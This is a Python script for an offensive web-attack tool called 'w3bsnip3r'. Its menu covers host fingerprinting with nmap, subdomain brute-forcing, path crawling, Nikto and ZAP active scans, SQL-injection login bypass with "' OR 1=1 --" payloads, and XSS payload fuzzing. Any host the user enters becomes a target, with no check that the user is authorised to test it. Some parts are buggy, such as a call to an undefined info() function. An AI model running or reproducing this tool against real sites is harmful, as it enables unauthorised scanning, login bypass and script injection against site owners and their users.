#!/usr/bin/python3

import sys
import os
import socket
import whois
import nmap
import getpass
from bs4 import BeautifulSoup
import subprocess
# "requests" library to send a GET request to the target
import requests
#to  iterate through the href links and extract sub-paths that include the target domain by using the "urlparse" 
from urllib.parse import urlparse
from zapv2 import ZAPv2


# Define ANSI escape codes for different colors
BLACK = "\033[0;30m"
DARK_GRAY = "\033[1;30m"
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
GRAY = "\033[0;37m"
RESET = "\033[0m"


def desc():
    print('')

#information gathering
def server_info():
    try:
        u = input(f"{DARK_GRAY}host - >> {RESET}")

        # get the IP address of the hostname
        ip_address = socket.gethostbyname(u)
        print(f"IP address for {u}: {ip_address}")

        # perform a WHOIS lookup on the IP address
        w = whois.whois(ip_address)
        print(f"WHOIS information:\n{w}")

        # check for root privileges
        if getpass.getuser() != 'root':
            print("TCP/IP fingerprinting (for OS scan) requires root privileges.")
            confirm = input("Do you want to run nmap as root? (y/n): ")
            if confirm.lower() == 'y':
                os.system(f"sudo nmap -O {ip_address}")
            else:
                print("OS scan skipped.")
        else:
            # perform an nmap scan to determine the server's OS and version
            nm = nmap.PortScanner()
            nm.scan(ip_address, arguments="-O")
            os_info = nm[ip_address]['osmatch'][0]
            print(f"Server OS and version: {os_info}")

    except socket.gaierror:
        print(f"Could not resolve hostname {u}")

    except KeyboardInterrupt:
        # If the user presses CTRL-C, exit the program
        print("Exiting program")
        exit()


#finding sub domain 
def find_subdomains():

    domain = input(f"{DARK_GRAY}Enter domain name ->> {RESET}")
    subdomains = []
    try:
        # Get the IP address of the domain
        ip_address = socket.gethostbyname(domain)

        # Loop through a range of common subdomains and attempt to resolve each one
        for i in range(1, 10):
            subdomain = f"test{i}.{domain}"
            try:
                socket.gethostbyname(subdomain)
                subdomains.append(subdomain)
            except socket.error:
                pass

        # Search for subdomains using search engines
        search_urls = [
            f"https://www.google.com/search?q=site:{domain}",
            f"https://search.yahoo.com/search?p=site:{domain}",
            f"https://www.bing.com/search?q=site:{domain}",
        ]
        for url in search_urls:
            try:
                res = requests.get(url)
                soup = BeautifulSoup(res.text, 'html.parser')
                for link in soup.find_all('a'):
                    href = link.get('href')
                    if href and href.startswith('http') and domain in href:
                        subdomain = href.split('//')[1].split('.')[0]
                        if subdomain not in subdomains:
                            subdomains.append(subdomain)
            except requests.exceptions.RequestException:
                pass
                
    except socket.gaierror:
        print(f"Could not resolve hostname {domain}")

    except KeyboardInterrupt:
        # If the user presses CTRL-C, exit the program
        print("Exiting program")
        exit()

    # Check if the target domain is provided as a command-line argument.
    if len(sys.argv) > 1:
        target_domain = sys.argv[1]
    else:
        pass

    # Create a list of common subdomain names.
    common_subdomains = ["www", "admin", "api", "dev", "staging", "test"]

    # Create a list of wordlists.
    wordlists = [
        "w3bsnip3r/common_subdomains.txt",
        "w3bsnip3r/popular_subdomains.txt",
        "w3bsnip3r/top_100k_domains.txt",
        "/usr/share/amass/wordlists/bitquark_subdomains_top100K.txt",
        #"/usr/share/amass/wordlists/subdomains-top1mil-110000.txt",
        #"/usr/share/amass/wordlists/subdomains-top1mil-20000.txt",
        #"/usr/share/amass/wordlists/subdomains-top1mil-5000.txt",
        #"/usr/share/amass/wordlists/subdomains.lst",
        #"/usr/share/legion/wordlists/gvit_subdomain_wordlist.txt",
    ]

    # Iterate over the wordlists.
    for wordlist in wordlists:
        try:
            # Read the wordlist into a list.
            with open(wordlist, "r") as f:
                subdomains = f.readlines()

            # Iterate over the subdomains in the wordlist.
            for subdomain in subdomains:
                # Remove the newline character from the end of the subdomain.
                subdomain = subdomain.strip()

                # Create a URL for the subdomain.
                url = f"https://{subdomain}.{domain}"

                # Make a request to the URL.
                try:
                    response = requests.get(url)

                    # Check the response status code.
                    if response.status_code == 200:
                        print(subdomain)
                except requests.exceptions.RequestException as e:
                    print(f"An error occurred while making the request: {e}")
        except FileNotFoundError:
            print(f"Wordlist '{wordlist}' not found.")


#finding sub-path of the domain 
def sub_path():
    # Define the target domain to crawl
    target_domain = input (f'''{DARK_GRAY}host - >> {RESET}''')

    # Send a request to the target domain and parse the HTML response
    response = requests.get(f"http://{target_domain}")
    html = response.text

    # Extract all href links from the HTML response
    links = html.split('href="')[1:]
    hrefs = [link.split('"')[0] for link in links]

    # Extract sub-paths from hrefs that include the target domain
    sub_paths = []
    for href in hrefs:
        if target_domain in href:
            sub_path = urlparse(href).path
            if sub_path != "":
                sub_paths.append(sub_path)

    # Remove duplicates and sort the sub-paths alphabetically
    sub_paths = sorted(list(set(sub_paths)))

    # Print the list of sub-paths found
    for sub_path in sub_paths:
        print(sub_path)


#vulnerability scan using nikto
def server_side():
        # define target url
        target_url = input(f"{DARK_GRAY}Enter domain name ->> {RESET}")

        # run nikto scan and output results to a file
        output_file = "nikto_results.txt"
        subprocess.run(["nikto", "-h", target_url, "-output", output_file])


#vulnerability scan using zap-proxy
def vulnerability():
    # Set up target URL and ZAP API key
    print(f"""{RED} 
    To Analyze the Vulnerabilities use zap-proxy, 
    To Execute this Function you need to Install Zap-Proxy 
    Use coMmand [sudo apt install zaproxy] {RESET}""")
    target_url = input(f"{DARK_GRAY}Enter domain name with [https://] ->> {RESET}")

    print(f"""{RED} 
    Get Your "API KEY"
    Zap-Proxy --> Tools --> Options --> API --> API Key{RESET}""")
    api_key = input(f"{DARK_GRAY}Enter ZAP API key ->> {RESET}")

    # Create ZAP instance and start scanning
    zap = ZAPv2(apikey=api_key)
    zap.urlopen(target_url)
    zap.spider.scan(target_url)
    zap.ascan.scan(target_url)

    # Retrieve list of vulnerabilities
    alerts = zap.core.alerts()

    # Print out results
    print(f"Total alerts found: {len(alerts)}")
    for alert in alerts:
        print(f"Alert: {alert['alert']} at URL: {alert['url']}")
#vulnerability()


#sql injection 
def sql_injection():

    # Get the target URL from user input
    target_url = input(f'''{DARK_GRAY}host - >> {RESET}''')

    # Load the wordlist for password
    wordlist_file = [
        "/usr/share/wfuzz/wordlist/Injections/SQL.txt",
        "/usr/share/wordlists/sqlmap.txt",
        "/usr/share/wfuzz/wordlist/vulns/sql_inj.txt",
        "/usr/share/wfuzz/wordlist/Injections/All_attack.txt",
        "/usr/share/wfuzz/wordlist/Injections",
        "/usr/share/legion/wordlists/mssql-betterdefaultpasslist.txt",
        "/usr/share/legion/wordlists/mysql-betterdefaultpasslist.txt",
        "/usr/share/sqlmap/data/txt/wordlist.tx_",
        "/usr/share/sqlmap/data/txt/wordlist.txt",
        "/usr/share/sqlmap/lib/core/wordlist.py",
        "/usr/share/sqlmap/lib/core/__pycache__/wordlist.cpython-311.pyc"
    ]

    wordlist_path = wordlist_file[0]  # Select the first file path from the list

    with open(wordlist_path, "r") as f:
        wordlist = [line.strip() for line in f]


    # Get the username from user input
    username = input("Enter the username -> ")

    # Prompt user for password payload input
    use_password_payload = input("Do you want to use a password payload from the wordlist? (y/n) ")

    # Variable to track SQL injection success
    sql_injection_found = False

    # Iterate over each payload in the wordlist for password if requested, else only use username payload
    if use_password_payload.lower() == "y":
        for password_payload in wordlist:
            # Craft the injection payload
            password_injection = f"' OR 1=1 -- {password_payload}"

            # Construct the data to be sent in the request
            data = {
                "username": username,
                "password": password_injection
            }

            # Send the POST request with the payload
            response = requests.post(target_url, data=data)

            # Check the response for indications of a successful injection
            if "Login successful" in response.text:
                print(f"SQL injection successful with username: {username}, password payload: {password_payload}")
                sql_injection_found = True

    else:
        # Craft the injection payload
        username_injection = f"' OR 1=1 --"

        # Construct the data to be sent in the request
        data = {
            "username": username,
            "password": username_injection
        }

        # Send the POST request with the payload
        response = requests.post(target_url, data=data)

        # Check the response for indications of a successful injection
        if "Login successful" in response.text:
            print(f"SQL injection successful with username payload only: {username}")
            sql_injection_found = True

    # Check if no SQL injection was found
    if not sql_injection_found:
        print("No SQL injection vulnerability found.")


#XSS vulnerabilities
def xss_attack():
    # Replace this URL with the target website you want to scan for XSS vulnerabilities
    target_url = input(f'''{DARK_GRAY}host - >> {RESET}''')

    # Path to the word list file containing XSS payloads
    wordlist_file = "/usr/share/wfuzz/wordlist/Injections/XSS.txt"

    # Function to send HTTP requests and check for potential XSS vulnerabilities
    def check_xss(url, payload):
        # Modify the request headers if needed (e.g., user-agent, cookies, etc.)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
        }

        # Make a GET request to the target URL with the payload
        response = requests.get(url + payload, headers=headers)

        # Check if the response contains any potential signs of XSS
        if payload in response.text:
            print("[+] Potential XSS vulnerability found with payload:", payload)

    # Read the word list file and iterate over each payload
    with open(wordlist_file, "r") as f:
        for line in f:
            payload = line.strip()  # Remove leading/trailing whitespaces or newlines
            check_xss(target_url, payload)

            
def main_menu():
    desc()
    # Print the banner with red color
    print(f""" {GREEN}
        ▓▓         ▓ 33333  ▒▒▒▒▒    ▓▓▓▓▓▓  ████  II PPPPP  33333  RR   RR
        ▓▓   ▓▓   ▓      33 ▒▒   ▒▒ ███     ▓▓  ▓▓ II PP   P     33 RR RR  R
        ▓▓  ▓ ▓  ▓  33333   ▒▒▒▒▒    ▓▓▓▓   ██  ██ II PPPPP 33333   RRR
        ▓▓ ▓   ▓         33 ▒▒   ▒▒     ███ ██  ██ II PP         33 RR
        ▓▓    ▓▓  3333333   ▒▒▒▒▒   ▓▓▓▓▓▓  ██  ██ II PP  3333333   RR {RESET} Version 1.0
    {YELLOW}
        ||O|||H |||T |||S ||| |||P ||| |||R |||O |||J |||E |||C |||T || {RESET}
    {BLUE}
                w3bsnip3r written by: Haseef Ahmed
                github:{RESET} https://github.com/mn-haseef/w3bsnip3r.git 
                
                {RED}Web Application Security Framework {RESET}
    """)
    print(f'''{GREEN}Options{RESET}

    [1] Information Gathering 
    [2] Find Sub Domain
    [3] Find Sub Path 
    [4] Vulnerability Scan "Nikto"
    [5] Vulnerability Scan "Zap-Proxy"
    [6] SQL Injection
    [7] XSS Attack 
    [8] Exit
    ''')

    try:
        i = input(f'''{BLUE}Select Option ->> {RESET}''')
    except:
        print('Invalid')
        sys.exit()

    if i == '-help':
        info()
        sys.exit()
    elif int(i) == 1:
        server_info()
    elif int(i) == 2:
        find_subdomains()
    elif int(i) == 3:
        sub_path()
    elif int(i) == 4:
        server_side()
    elif int(i) == 5:
        vulnerability()
    elif int(i) == 6:
        sql_injection()
    elif int(i) == 7:
        xss_attack()
    elif int(i) == 8:
      print(f'''{RED}Terminated !!{RESET}''')
      sys.exit()

    else:
        print(f'''{RED}Entered an Incorrect Value{RESET}''')
        sys.exit()

    main_menu()

main_menu()

